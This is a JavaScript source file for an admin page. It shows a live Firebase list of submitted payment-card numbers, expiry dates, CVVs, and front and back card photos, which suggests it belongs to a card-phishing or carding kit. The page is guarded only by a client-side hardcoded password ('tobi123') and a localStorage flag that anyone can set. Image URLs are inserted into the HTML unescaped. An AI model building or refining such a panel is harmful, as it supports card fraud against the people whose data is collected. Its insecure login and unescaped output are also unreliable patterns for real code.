// public/admin.js
const password = 'tobi123'; // change anytime
let loggedIn = false;

document.addEventListener('DOMContentLoaded', () => {
  const loginScreen = document.getElementById('loginScreen');
  const submissionsList = document.getElementById('submissionsList');
  const loginBtn = document.getElementById('loginBtn');
  const passwordInput = document.getElementById('passwordInput');
  const loginError = document.getElementById('loginError');
  const logoutBtn = document.getElementById('logoutBtn');

  function checkLogin() {
    if (localStorage.getItem('adminLoggedIn') === 'true') {
      loggedIn = true;
      loginScreen.classList.add('hidden');
      loadSubmissions();
    } else {
      loginScreen.classList.remove('hidden');
      submissionsList.innerHTML = '';
    }
  }

  loginBtn.onclick = () => {
    if (passwordInput.value === password) {
      localStorage.setItem('adminLoggedIn', 'true');
      checkLogin();
    } else {
      loginError.textContent = 'Invalid password';
    }
  };

  logoutBtn.onclick = () => {
    localStorage.removeItem('adminLoggedIn');
    checkLogin();
  };

  checkLogin();

  // LIVE LISTENER
  db.ref('submissions').on('value', (snapshot) => {
    const data = snapshot.val();
    if (!data) {
      submissionsList.innerHTML = '<p class="text-gray-500">No submissions yet.</p>';
      return;
    }

    const entries = Object.entries(data).reverse();
    submissionsList.innerHTML = entries.map(([id, entry], idx) => {
      const num = entries.length - idx;
      return `
        <div class="submission-card">
          <div class="submission-title">Submission #${num}</div>
          <div><span class="field-label">CardNumber:</span> ${escape(entry.card_number)}</div>
          <div class="divider"></div>
          <div><span class="field-label">ExpiryDate:</span> ${escape(entry.expiry_date)}</div>
          <div class="divider"></div>
          <div><span class="field-label">Cvv:</span> ${escape(entry.cvv)}</div>
          ${entry.front_image || entry.back_image ? `
            <div class="divider"></div>
            <div><span class="field-label">Images:</span></div>
            <div class="gallery">
              ${entry.front_image ? `<a href="${entry.front_image}" target="_blank"><img src="${entry.front_image}"></a>` : ''}
              ${entry.back_image ? `<a href="${entry.back_image}" target="_blank"><img src="${entry.back_image}"></a>` : ''}
            </div>
          ` : ''}
          <div class="divider"></div>
          <div><span class="field-label">SubmittedAt:</span> ${new Date(entry.timestamp).toLocaleString()}</div>
          <div class="mt-4">
            <button onclick="db.ref('submissions/${id}').remove();" class="delete-btn">Delete</button>
          </div>
        </div>`;
    }).join('');
  });
});

function escape(str) { return String(str).replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m])); }
